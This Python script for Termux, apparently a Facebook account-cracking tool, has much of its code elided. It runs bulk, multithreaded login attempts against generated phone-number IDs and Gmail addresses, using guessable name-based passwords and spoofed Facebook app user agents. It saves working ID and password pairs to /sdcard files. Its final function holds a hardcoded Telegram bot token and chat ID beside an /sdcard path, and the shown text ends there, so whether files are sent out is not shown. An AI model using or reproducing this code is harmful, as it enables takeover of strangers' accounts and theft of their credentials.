...
#uft-8
#!/usr/bin/python
#Tool :𝙎𝘼𝙇𝙈𝘼𝙉 Best FB Clone 
#coding by 𝙎𝘼𝙇𝙈𝘼𝙉 𝙑𝘼𝙄 𝟭𝟮
# 𝙎𝘼𝙇𝙈𝘼𝙉 𝙏𝙀𝙍𝙈𝙐𝙓 𝙕𝙊𝙉𝙀
#GitHub :𝙎𝘼𝙇𝙈𝘼𝙉𝙑𝘼𝙄𝟭𝟮
...
x1r="\033[1;31m" #Red
x1g="\033[1;32m" #Green
x1y="\033[1;33m" #Yellow
x1blu="\033[1;34m" #Blue
x1p="\033[1;35m" #Pink
x1sb="\033[1;36m" #SkyBlue
x1w="\033[1;37m" #White
idx = []
loop = 0
proxy_list = []
...
def uaku():
	try:
		...
		for ub in ua : 
			ugen.append(ub)
#https://github.com/EC-1709/a/blob/main/bbnew.txt
	except:
...
def my_main():
    os.system("clear")
    print(logo)
    print(" \033[1;31m[\033[1;32m1\033[1;31m] \033[1;33mFile Crack")
    print(" ")
    print('\033[1;36m ⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱𝙅𝙊𝙆𝙀𝙍⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱--------------')
    print(" ")
    my_ = input(" \033[1;31m[\033[1;32m?\033[1;31m] \033[1;33mSellect \033[1;32m: ")
    if my_ == "1":
        file_c()
def file_c():
    os.system("clear")
    print(logo)
    try:
        file = input("\033[1;31m [\033[1;32m+\033[1;31m] \033[1;33mFile Location \033[1;32m:  ")
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(" \033[1;33m[\033[1;31m+\033[1;33m] \033[1;31mFile Not in Location")
        my_main()
    cloning_two()
    exit()
def cloning_two():
    ...
    print(logo)
  #  print(50*'-')
    print(f" {W}\033[1;31m[\033[1;32m1\033[1;31m] \033[1;32mLMNx9 Password")
    print(f" {W}\033[1;31m[\033[1;32m2\033[1;31m] \033[1;32mChoice Passwords")
    print(f" {W}[B] Back {W}")
    clon_ = input(" \033[1;31m[\033[1;32m?\033[1;31m] \033[1;33mSellect \033[1;32m: ")
    if clon_ == "1":
        pas = ["first last",'firstlast','first123','first@123','first@1234','first@12345','first1234','first','first12345','firstlast12345','firstlast1234','firstlast12345','firstlast@12345','firstlast@1234','firstlast@123','first786','first12','firstfirst','first','lastlast','1234567890first','0987654321first','1234567890last','0987654321last','@first','@last','first13579','last13579','first@@@','last@@@','first999','last999','017firstlast','018firstlast','019firstlast','first000','firstlast000']
        for px in pas:
            pp.append(px)
        pass
    elif clon_ == "2":
        ...
        print(logo)
      #  print(50*'-')
        lp = input(' \033[1;31m[\033[1;32m+\033[1;31m] \033[1;33mPassword Limit \033[1;32m:  ')
        #print("\n")
        if lp.isnumeric():
           # print(f" {P}Example : [ firstlast first last first123 ] \")
            for x in range(int(lp)):
                pp.append(input(f' {W}\033[1;31m[\033[1;32m+\033[1;31m] \033[1;33mPassword {x+1}\033[1;32m: '))
            pass
        else:
            print(" \033[1;32menter only numbers ")
            exit()
    elif clon_ == "B":
        my_main()
    else:
        exit(" \033[1;31mplease enter valid option ")
    os.system("clear")
    print(logo)
    print(' \033[1;31m[\033[1;32m✓\033[1;31m] \033[1;36mCracTermux_Hack Limit \033[1;32m: '+str(len(idx)))
    print(" \033[1;31m[\033[1;32m✓\033[1;31m] \033[1;36mLMNx9 CracTermux_Hack System Started")
    print(" \033[1;31m[\033[1;32m✓\033[1;31m] \033[1;36mTo stop process press \033[1;31mCTRL+c")
    print(" \033[1;36m⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱𝙅𝙊𝙆𝙀𝙍⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱---------")
    fax = ('|')
    def rana(user):
        global loop,idx
        ...
        for px in pp:
            ...
            ugm = f"[FBAN/FB4A;FBAV/"+net+".0.0.77.46;FBBV/251145743;FBDM/{density=2.625,width=1080,height=1920};FBLC/pt_BR;FBRV/"+str(random.randint(000000000,999999999))+";FBCR/AWCC;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/"+zov+";FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111,999999999))
          ...
          #  print (ua)
            ...
            if 'session_key' in response.text:
                print('\r{}\033[1;31m [ \033[1;32m𝙅𝙊𝙆𝙀𝙍-OK \033[1;31m] {} {} {} {}'.format(G, url, fax, px, mys))
        ...
        #        print('\r{}\033[1;94m[2F-Termux_Hack] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/2f.txt','a').write(f'{url}|{px}\n')
            else:
                #print(response.text)
                continue
        sys.stdout.write('\r {} \033[1;31m[ \033[1;32m𝙅𝙊𝙆𝙀𝙍 \033[1;31m] [{}|{}] \033[1;32m[OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
    with tpe(max_workers=30) as tp:
        tp.map(rana, idx)
    print("\n\033[1;36m⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱𝙅𝙊𝙆𝙀𝙍⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱-")
    print(" \033[1;31m[\033[1;32m+\033[1;31m] \033[1;36mIf You Enjoy \033[1;32mSend \033[1;36mFeeback")
    print("\033[1;36m⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱𝙅𝙊𝙆𝙀𝙍⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱-  ")
    exit()
def l1():
	print('\033[1;36m⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱𝙅𝙊𝙆𝙀𝙍⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱')
...
def cek_apk(session,coki):
	...
	if len(game)==0:
		print(f'\r%s [%s•%s] %s\033[1;32mActive Apks & Web \033[1;31mNot Found %s		'%(N,H,N,H,N))
	else:
		print(f'\r{A}\033[1;31m [\033[1;32m✓\033[1;31m]%s \033[1;32mActive Apks & Web 👇 '%(H))
	...
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %s\033[1;33mExpired Apks & Web \033[1;31mNot Found %s		'%(N,M,N,M,N))
	else:
		print(f'\r{A} \033[1;31m[\033[1;32m✓\033[1;31m]%s \033[1;33mExpired Apks & Web 👇 '%(M))
		for i in range(len(game)):
...
def menu(): 
			os.system('clear');print(logo);print(' \033[1;31m[\033[1;32m1\033[1;31m] \033[1;32mFile cloning\n \033[1;31m[\033[1;32m3\033[1;31m] \033[1;32mRandom Crack\n\033[1;31m [\033[1;32m5\033[1;31m] \033[1;36mTELEGRAM Group \033[1;32m[Joker]\n\033[1;31m [\033[1;32m0\033[1;31m] \033[1;31mExit \033[1;32mmenu')
			l1()
			xd=input(' \033[1;33mChoose an option \033[1;32m: ')
			if xd in ['1','01']:
				my_main()
			#elif xd in ['2','02']:
			#	pass
			#	print("\033[1;31mCurrently Not Available")
				##############################
				#------Main Py---------#
			#elif xd in ['3','03']:
				#pass
				...
				clear()
				print(' \033[1;31m[\033[1;32m1\033[1;31m] \033[1;33mAfghanistan cloning\n \033[1;31m[\033[1;32m2\033[1;31m] \033[1;32mBangladesh cloning\n \033[1;31m[\033[1;32m3\033[1;31m] \033[1;33mGmail cloning\n \033[1;31m[\033[1;32m0\033[1;31m] \033[1;31mBack \033[1;32Afghan')
				l1()
				x=input(' \033[1;31m[\033[1;32m+\033[1;31m] \033[1;33mChoose \033[1;32m: ')
				if x in ['1','01']:
					pak()
				elif x in ['2','02']:
					bd()
 ...
 #----------+------+-+-------+---------+--+-----------+--+------+---+----------#
 #------++--------+-----TELEGRAM Group Link----------+++------#			
				os.system(f'xdg-open https://t.me/+jokerkhanoo ');menu()
			elif xd in ['0','00']:
				exit(' \033[1;31m[\033[1;32m✓\033[1;31m] \033[1;32mIf You Enjoy This Tool \033[1;36mShare \033[1;32mYour Opinion')
			else:
				exit(' Option not found in menu...')
def pak():
                user=[]
                clear()
                print('\033[1;36m Code \033[1;34mexample : \033[1;32m0706\033[1;31m/\033[1;32m0785\033[1;31m/\033[1;32m0735\033[1;31m/\033[1;32m0700')
                code = input('\033[1;34m put code \033[1;32m: ')
                try:
                        limit = int(input('\033[1;34m example : \033[1;32m2000, \033[1;33m3000, \033[1;34m5000,\n\033[1;34m put limit \033[1;32m: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as ATermux_Hack:     
                        clear()
                        tl = str(len(user))
                        print(' \033[1;31m[\033[1;32m✓\033[1;31m] \033[1;33mCracTermux_Hack Limit   : \033[1;32m'+tl)
                        print(f'\033[1;31m [\033[1;32m✓\033[1;31m] \033[1;33mChoice code   :\033[1;32m '+code)
                        print(f'\033[1;31m [\033[1;32m✓\033[1;31m] \033[1;32mLMNx9 CracTermux_Hack System Started\033[1;97m')
                        print(" ")
                        print("\033[1;36m⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱𝙅𝙊𝙆𝙀𝙍⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱---------")
                        for psx in user:
                                ids = code+psx
                                ...
                                ATermux_Hack.submit(rndm,ids,passlist)
                print(' \033[1;37m')             
                print(' \033[1;32mThe process has completed')
                print(' \033[1;33mTotal \033[1;32mOK\033[1;32m/\033[1;31mCP\033[1;32m/\033[1;35m2F \033[1;32m: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                l1()
                input(' \033[1;32mPress enter to back Menu')
                os.system('python Termux_Hack.py')
def bd():
                user=[]
                clear()
                print('\033[1;33m Code \033[1;32mexample \033[1;32m: \033[1;32m017\033[1;31m/\033[1;32m017\033[1;31m/\033[1;32m012\033[1;31m/\033[1;32m019')
                code = input('\033[1;33m put code \033[1;32m: ')
                try:
                        limit = int(input('\033[1;33m example \033[1;32m: 2000, \033[1;31m3000, \033[1;34m5000, \033[1;35m10000\n\033[1;33m put limit \033[1;32m: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                ...
                with tred(max_workers=30) as ATermux_Hack:     
                        clear()
                        tl = str(len(user))
                        print(' \033[1;31m[\033[1;32m✓\033[1;31m] \033[1;33mCracTermux_Hack Limit   \033[1;32m: \033[1;32m'+tl)
                        print(f'\033[1;31m [\033[1;32m✓\033[1;31m] \033[1;33mChoice code \033[1;32m : \033[1;32m '+code)
                        print(f'\033[1;31m [\033[1;32m✓\033[1;31m] \033[1;32mLMNx9 CracTermux_Hack System Started\033[1;97m')
                        print(" ")
                        print("\033[1;36m ⊰᯽⊱─╌⊰❊⊱╌──┈⊰᯽⊱𝙅𝙊𝙆𝙀𝙍⊰᯽⊱┈──╌⊰❊⊱╌─⊰᯽⊱---------")
                        for psx in user:
               ...
               # l1()
                print(' \033[1;32mThe process has completed')
                print(' \033[1;33mTotal \033[1;32mOK\033[1;33m/\033[1;31mCP\033[1;33m/\033[1;34m2F \033[1;32m: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                l1()
                input(' Press enter to back Menu ')
                os.system('python Termux_Hack.py')
def gmail():
                os.system('rm -rf .re.txt');os.system('clear');print(logo)  
                print('\033[1;33m example\033[1;36m : Girls:- \033[1;32afghanistan, \033[1;33mohammed, \033[1;34Afghanistanafghan,\033[1;35m password,\n \033[1;36mBoys:- \033[1;32pubgKing, \033[1;33Afghanpubg, \033[1;34KhanKhan, \033[1;34123456 \033[1;97m')
                l1()
                first = input(' \033[1;33mPut first name\033[1;32m : ')
                l1()
                print('\033[1;33m example :\n \033[1;36mGirls:- \033[1;32Afghanistan,\033[1;33m afghanistan, \033[1;34Mohammed, \033[1;35wwwwww,\n \033[1;36mBoys:- \033[1;32Ashan Khanoo, \033[1;33mmiya, \033[1;34mislam, \033[1;35mshah ')
                l1()
                last = input(' \033[1;33mPut last name\033[1;32m : ')
                l1()
                print(' \033[1;33mExample \033[1;32m : @gmail.com , \033[1;34m@yahoo.com ,\033[1;31m @hotmail.com \033[1;30metc...')
                l1()
                domain = input(' domain: ')
                l1()
                try:
                        limit=int(input(' \033[1;33mPut limit\033[1;32m : '))
                except ValueError:
                        limit = 5000
                l1()
                ...
                with tred(max_workers=30) as ATermux_Hack:
                        total = str(len(fo))
                        clear()
                        print(' \033[1;31m[\033[1;32m✓\033[1;31m] \033[1;33mCracTermux_Hack Limit \033[1;32m: \033[1;32m'+total)
                        print("\033[1;31m[\033[1;32m✓\033[1;31m] \033[1;32mLMNx9 CracTermux_Hack System\033[1;36m Started\033[1;37m")
                        l1()
                        for user in fo:
                ...
                print('\033[1;37m')             
                print(' \033[1;32mThe process has completed')
                print(' \033[1;33mTotal \033[1;32mOK\033[1;33m/\033[1;31mCP\033[1;33m/\033[1;30m2F \033[1;32m: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                l1()
                input(' \033[1;31mPress enter to back ')
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;31m [ \033[1;32m𝙅𝙊𝙆𝙀𝙍 \033[1;31m] [%s] [\033[1;32mOK : %s ] \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.75,width=720,height=1640};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        headers={
                                ...
                                'User-Agent':"[FBAN/FB4A;FBAV/"+zomir+".0.0.6.119;FBBV/30034644;FBDM/{density=3.02,width=720,height=1544};FBLC/en_US;FBCR/AWCC;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/"+cph+";FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;31m [ \033[1;32m𝙅𝙊𝙆𝙀𝙍-OK\033[1;31m] \033[1;32m : '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Termux_HackOK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
              ...
              #                          print('\r\r\x1b[38;5;208m [Checkpoint] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Termux_Hack-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def sexy():
    ...
    bot_token = '6982760728:AAHpgEJpue_Bwk5n7qXr386Vq0lOIXc4-DU' 
    chat_id = '6225325598'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
